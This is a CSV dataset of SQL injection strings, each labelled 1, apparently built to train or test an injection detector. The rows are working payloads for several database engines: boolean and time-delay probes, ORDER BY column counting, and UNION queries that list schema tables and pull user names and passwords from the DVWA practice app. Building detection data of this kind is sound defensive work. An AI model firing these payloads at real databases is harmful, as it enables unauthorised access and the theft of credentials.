input_text,Label
-8883'))) OR 4651=4987 AND ((('oMOF' LIKE 'oMOF,1
-4480'))) OR 3355=3355 AND ((('CCJx' LIKE 'CCJx,1
-5003%' OR 4343=1596 AND 'yTZn%'='yTZn,1
-7146%' OR 3355=3355 AND 'RVIF%'='RVIF,1
-6710' OR 6252=2447 AND 'eaWA' LIKE 'eaWA,1
-1570' OR 3355=3355 AND 'GdBt' LIKE 'GdBt,1
"-7897"") OR 3547=1441 AND (""cqJH""=""cqJH",1
"-7730"") OR 3355=3355 AND (""MiGg""=""MiGg",1
"-4559"")) OR 3544=1735 AND ((""RlIO""=""RlIO",1
"-4433"")) OR 3355=3355 AND ((""MugH""=""MugH",1
"-7812""))) OR 3631=5653 AND (((""fazc""=""fazc",1
"-6106""))) OR 3355=3355 AND (((""KlPZ""=""KlPZ",1
"-9225"" OR 8771=7842 AND ""CMqV""=""CMqV",1
"-1994"" OR 3355=3355 AND ""cjin""=""cjin",1
"-4237"") OR 6406=1906 AND (""bLgT"" LIKE ""bLgT",1
"-7424"") OR 3355=3355 AND (""fZih"" LIKE ""fZih",1
"-3239"")) OR 2697=7161 AND ((""pDjg"" LIKE ""pDjg",1
"-5459"")) OR 3355=3355 AND ((""gMMI"" LIKE ""gMMI",1
"-6057""))) OR 7595=9363 AND (((""Vswr"" LIKE ""Vswr",1
"-4087""))) OR 3355=3355 AND (((""jsxC"" LIKE ""jsxC",1
"-8088"" OR 7970=7005 AND ""sWTV"" LIKE ""sWTV",1
"-9754"" OR 3355=3355 AND ""vrWx"" LIKE ""vrWx",1
-8590 OR 5422=1482-- InoS,1
-8289 OR 3355=3355-- aFgv,1
-1677 OR 6239=8630-- sHOE,1
-5909 PxzRcTMAoc-- FbMB,1
-5210 OR 7112=6192# TzGJ,1
-9029 OR 3355=3355# kHKS,1
-1460 OR 5815=1564# kSeH,1
-8459 PxzRcTMAoc# XVJz,1
-6838' OR 9328=2100 OR 'QDBQ'='MAxP,1
-7967' OR 3355=3355 OR 'wZIr'='yycM,1
-1796') WHERE 7195=7195 OR 2984=9066-- lxeQ,1
-2047') WHERE 4396=4396 OR 3355=3355-- YGPc,1
"-2086"") WHERE 2802=2802 OR 7471=4879-- iCSp",1
"-1593"") WHERE 9753=9753 OR 3355=3355-- GuPD",1
-7006) WHERE 1796=1796 OR 9999=7544-- YYFo,1
-8079) WHERE 4283=4283 OR 3355=3355-- zWdo,1
-6496' WHERE 1512=1512 OR 2428=5275-- QGiw,1
-5226' WHERE 3034=3034 OR 3355=3355-- Mwbq,1
"-4937"" WHERE 8596=8596 OR 9721=2664-- gaWX",1
"-6851"" WHERE 5899=5899 OR 3355=3355-- cXDX",1
-7747 WHERE 4170=4170 OR 9056=8656-- woaB,1
-9059 WHERE 3252=3252 OR 3355=3355-- xeWE,1
-8940')) AS XNbc WHERE 2758=2758 OR 9163=1008-- JaRN,1
-5346')) AS yQDm WHERE 2358=2358 OR 3355=3355-- AkoM,1
"-3819"")) AS kSbb WHERE 5270=5270 OR 3991=4839-- UfvX",1
"-3655"")) AS UQNd WHERE 7975=7975 OR 3355=3355-- NSFs",1
-4759)) AS pOfU WHERE 9195=9195 OR 5994=8186-- VHBc,1
-5022)) AS fZyX WHERE 5482=5482 OR 3355=3355-- QIiU,1
-8144') AS QOjy WHERE 5218=5218 OR 7181=8745-- GPMd,1
-5987') AS Ccoz WHERE 3546=3546 OR 3355=3355-- lBzq,1
"-2422"") AS FjFE WHERE 8152=8152 OR 7076=7490-- kgCB",1
"-1204"") AS rvJX WHERE 6177=6177 OR 3355=3355-- cOIW",1
-8943) AS ALRH WHERE 7095=7095 OR 2593=5400-- Hxtd,1
-1065) AS jVoP WHERE 9277=9277 OR 3355=3355-- xycH,1
3) OR NOT 4163=2012-- xmRR,1
3) OR NOT 5661=5661-- DcCi,1
3') OR NOT 1619=4178-- iItv,1
3') OR NOT 5661=5661-- rslb,1
3' OR NOT 1110=2364-- GnbX,1
3' OR NOT 5661=5661-- anLH,1
"3"" OR NOT 9514=9352-- tsda",1
"3"" OR NOT 5661=5661-- MwdZ",1
3) OR NOT 6799=6664 AND (4958=4958,1
3) OR NOT 5661=5661 AND (5798=5798,1
3)) OR NOT 6364=2042 AND ((1411=1411,1
3)) OR NOT 5661=5661 AND ((8457=8457,1
3))) OR NOT 1983=9070 AND (((7758=7758,1
3))) OR NOT 5661=5661 AND (((2370=2370,1
3 OR NOT 3674=4663,1
3 OR NOT 5661=5661,1
3 OR NOT 6902=7008,1
"(SELECT CONCAT(CONCAT(0x7176627a71,(CASE WHEN (2157=2157) THEN 0x31 ELSE 0x30 END)),0x716a7a6a71))",1
"3 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176627a71,(SELECT (ELT(5348=5348,1))),0x716a7a6a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1
"(SELECT CONCAT(0x7176627a71,(ELT(6769=6769,1)),0x716a7a6a71))",1
3;SELECT SLEEP(5)#,1
3;SELECT SLEEP(5),1
3;(SELECT * FROM (SELECT(SLEEP(5)))FNpH)#,1
3;(SELECT * FROM (SELECT(SLEEP(5)))OwTD),1
"3;SELECT BENCHMARK(5000000,MD5(0x54755357))#",1
"3;SELECT BENCHMARK(5000000,MD5(0x78417443))",1
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj),1
3 AND (SELECT 7988 FROM (SELECT(SLEEP(0)))Bnmj),1
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj),1
3 ORDER BY 1-- -,1
3 ORDER BY 4860-- -,1
3 ORDER BY 10-- -,1
3 ORDER BY 6-- -,1
3 ORDER BY 4-- -,1
3 ORDER BY 3-- -,1
3 ORDER BY 2-- -,1
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL UNION ALL SELECT CONCAT(0x7176627a71,0x69574f714b6f78734659795058646870536f6e6f706267476f727a6d43616a506b4d4a47694e4349,0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL FROM (SELECT 0 AS WRTt UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS ZkPF-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716a7a6a71),NULL-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,table_name)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(table_name AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`comment`,`name`,comment_id)),0x716a7a6a71),NULL FROM dvwa.guestbook-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`comment` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(`name` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(comment_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.guestbook-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`user`,avatar,failed_login,first_name,last_login,last_name,password,user_id)),0x716a7a6a71),NULL FROM dvwa.users-- -",1
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`user` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(avatar AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(failed_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(first_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(password AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(user_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.users-- -",1
3 ORDER BY 6744#,1
3 ORDER BY 1#,1
"3"" ORDER BY 7211#",1
"3"" ORDER BY 1#",1
"3"") ORDER BY 8686#",1
"3"") ORDER BY 1#",1
3' ORDER BY 7564#,1
3' ORDER BY 1#,1
3%' ORDER BY 1033#,1
3%' ORDER BY 1#,1
3') ORDER BY 8686#,1
3') ORDER BY 1#,1
3' ORDER BY 3790#,1
3' ORDER BY 1#,1
3')) ORDER BY 2914#,1
3')) ORDER BY 1#,1
3') ORDER BY 2568#,1
3') ORDER BY 1#,1
3 ORDER BY 3059#,1
3 ORDER BY 1#,1
3)) ORDER BY 6005#,1
3)) ORDER BY 1#,1
3) ORDER BY 5307#,1
3) ORDER BY 1#,1
3 ORDER BY 7681-- exRh,1
3 ORDER BY 1-- IcZC,1
"3"" ORDER BY 3315-- JbsW",1
"3"" ORDER BY 1-- uCuA",1
"3"") ORDER BY 5441-- HOfi",1
"3"") ORDER BY 1-- eSPw",1
3' ORDER BY 4422-- njvx,1
3' ORDER BY 1-- tbrl,1
3%' ORDER BY 9544-- cGHl,1
3%' ORDER BY 1-- zoPm,1
3') ORDER BY 6673-- SQNQ,1
3') ORDER BY 1-- GQEW,1
3' ORDER BY 7280-- qZqT,1
3' ORDER BY 1-- Qrjg,1
3')) ORDER BY 1744-- uSNP,1
3')) ORDER BY 1-- bQjG,1
3') ORDER BY 2936-- FxFH,1
3') ORDER BY 1-- iZtd,1
3 ORDER BY 9405-- ARju,1
3 ORDER BY 1-- yJiY,1
3)) ORDER BY 6140-- ueVq,1
3)) ORDER BY 1-- aYYF,1
3) ORDER BY 4028-- xiFv,1
3) ORDER BY 1-- RJwx,1
(CASE WHEN (6860=6860) THEN SLEEP(5) ELSE 6860 END),1
3 AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- gmne,1
"3"" AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ""VlGZ""=""VlGZ",1
"3"") AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (""GaVs""=""GaVs",1
3' AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'dsDl' LIKE 'dsDl,1
3%' AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'hgay%'='hgay,1
3') AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('uXnf' LIKE 'uXnf,1
3' AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'miGq'='miGq,1
3')) AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (('XPZM'='XPZM,1
3') AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('VITi'='VITi,1
3 AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR),1
3)) AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((2332=2332,1
3) AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (6031=6031,1
"3 AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- ffzw",1
"3"" AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ""yPUH""=""yPUH",1
"3"") AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (""wXYE""=""wXYE",1
"3' AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'Afho' LIKE 'Afho",1
"3%' AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'yiHu%'='yiHu",1
"3') AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ('xeyB' LIKE 'xeyB",1
"3' AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'VNvr'='VNvr",1
"3')) AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (('wcfq'='wcfq",1
"3') AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ('ynhh'='ynhh",1
"3 AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)",1
"3)) AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ((4741=4741",1
"3) AND 3209=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (6678=6678",1
"3 AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5)-- EaAC",1
"3"" AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND ""kfjC""=""kfjC",1
"3"") AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND (""AZSL""=""AZSL",1
"3' AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND 'bLyQ' LIKE 'bLyQ",1
"3%' AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND 'bhPI%'='bhPI",1
"3') AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND ('uJQY' LIKE 'uJQY",1
"3' AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND 'qSNY'='qSNY",1
"3')) AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND (('wrND'='wrND",1
"3') AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND ('ZjPG'='ZjPG",1
"3 AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5)",1
"3)) AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND ((6991=6991",1
"3) AND 5695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(88)||CHR(69)||CHR(111),5) AND (8376=8376",1
"3 AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- UFTV",1
"3"" AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ""STnQ""=""STnQ",1
"3"") AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (""igdB""=""igdB",1
"3' AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'BZlL' LIKE 'BZlL",1
"3%' AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'XKJN%'='XKJN",1
"3') AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('Teaw' LIKE 'Teaw",1
"3' AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'oEXH'='oEXH",1
"3')) AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (('QUHw'='QUHw",1
"3') AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('HWkn'='HWkn",1
"3 AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)",1
"3)) AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ((3267=3267",1
"3) AND 8728=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND (4728=4728",1
3 WAITFOR DELAY '0:0:5'-- uvUj,1
"3"" WAITFOR DELAY '0:0:5' AND ""pPFD""=""pPFD",1
"3"") WAITFOR DELAY '0:0:5' AND (""FWgz""=""FWgz",1
3' WAITFOR DELAY '0:0:5' AND 'Fkwl' LIKE 'Fkwl,1
3%' WAITFOR DELAY '0:0:5' AND 'wxsW%'='wxsW,1
3') WAITFOR DELAY '0:0:5' AND ('QNcZ' LIKE 'QNcZ,1
3' WAITFOR DELAY '0:0:5' AND 'Jegi'='Jegi,1
3')) WAITFOR DELAY '0:0:5' AND (('vDuR'='vDuR,1
3') WAITFOR DELAY '0:0:5' AND ('gcfl'='gcfl,1
3 WAITFOR DELAY '0:0:5',1
3)) WAITFOR DELAY '0:0:5' AND ((1024=1024,1
3) WAITFOR DELAY '0:0:5' AND (9959=9959,1
"3 AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))-- GqAW",1
"3"" AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND ""XrWf""=""XrWf",1
"3"") AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND (""Ueyp""=""Ueyp",1
"3' AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND 'NGxY' LIKE 'NGxY",1
"3%' AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND 'RBWi%'='RBWi",1
"3') AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND ('XAcG' LIKE 'XAcG",1
"3' AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND 'umJa'='umJa",1
"3')) AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND (('OexC'='OexC",1
"3') AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND ('HosS'='HosS",1
"3 AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))",1
"3)) AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND ((6469=6469",1
"3) AND 9924=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND (7952=7952",1
3 AND 9091=(SELECT 9091 FROM PG_SLEEP(5))-- lWRW,1
"3"" AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND ""RHrC""=""RHrC",1
"3"") AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND (""OmMM""=""OmMM",1
3' AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND 'gYDb' LIKE 'gYDb,1
3%' AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND 'OaHu%'='OaHu,1
3') AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND ('MjJo' LIKE 'MjJo,1
3' AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND 'QbWP'='QbWP,1
3')) AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND (('ZTcD'='ZTcD,1
3') AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND ('CzTv'='CzTv,1
3 AND 9091=(SELECT 9091 FROM PG_SLEEP(5)),1
3)) AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND ((1168=1168,1
3) AND 9091=(SELECT 9091 FROM PG_SLEEP(5)) AND (1279=1279,1
3 RLIKE SLEEP(5)-- RWsY,1
"3"" RLIKE SLEEP(5) AND ""Jueq""=""Jueq",1
"3"") RLIKE SLEEP(5) AND (""gozC""=""gozC",1
3' RLIKE SLEEP(5) AND 'cRdA' LIKE 'cRdA,1
3%' RLIKE SLEEP(5) AND 'JdRh%'='JdRh,1
3') RLIKE SLEEP(5) AND ('Eflj' LIKE 'Eflj,1
3' RLIKE SLEEP(5) AND 'oFDq'='oFDq,1
3')) RLIKE SLEEP(5) AND (('MNXt'='MNXt,1
3') RLIKE SLEEP(5) AND ('sLPH'='sLPH,1
3 RLIKE SLEEP(5),1
3)) RLIKE SLEEP(5) AND ((3941=3941,1
3) RLIKE SLEEP(5) AND (2675=2675,1
"3 AND 4554=BENCHMARK(5000000,MD5(0x55516475))-- NrJE",1
"3"" AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND ""QZNP""=""QZNP",1
"3"") AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND (""hWpF""=""hWpF",1
"3' AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND 'wFWQ' LIKE 'wFWQ",1
"3%' AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND 'VGUR%'='VGUR",1
"3') AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND ('rVhR' LIKE 'rVhR",1
"3' AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND 'QCxF'='QCxF",1
"3')) AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND (('EmJS'='EmJS",1
"3') AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND ('LjHb'='LjHb",1
"3 AND 4554=BENCHMARK(5000000,MD5(0x55516475))",1
"3)) AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND ((7680=7680",1
"3) AND 4554=BENCHMARK(5000000,MD5(0x55516475)) AND (4859=4859",1
3 AND SLEEP(5)-- TwHM,1
"3"" AND SLEEP(5) AND ""OyYN""=""OyYN",1
"3"") AND SLEEP(5) AND (""XkDt""=""XkDt",1
3' AND SLEEP(5) AND 'sFLO' LIKE 'sFLO,1
3%' AND SLEEP(5) AND 'cYPf%'='cYPf,1
3') AND SLEEP(5) AND ('HYry' LIKE 'HYry,1
3' AND SLEEP(5) AND 'rKvq'='rKvq,1
3')) AND SLEEP(5) AND (('pfOT'='pfOT,1
3') AND SLEEP(5) AND ('HFJp'='HFJp,1
3 AND SLEEP(5),1
3)) AND SLEEP(5) AND ((8644=8644,1
3) AND SLEEP(5) AND (8007=8007,1
3 AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT)-- TenK,1
"3"" AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND ""ULko""=""ULko",1
"3"") AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND (""xZgh""=""xZgh",1
3' AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND 'Dfwt' LIKE 'Dfwt,1
3%' AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND 'xhRm%'='xhRm,1
3') AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND ('lOEC' LIKE 'lOEC,1
3' AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND 'yXxK'='yXxK,1
3')) AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND (('Lqlt'='Lqlt,1
3') AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND ('ToLe'='ToLe,1
3 AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT),1
3)) AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND ((8928=8928,1
3) AND (SELECT 8377 FROM (SELECT(SLEEP(5)))TZHT) AND (8397=8397,1
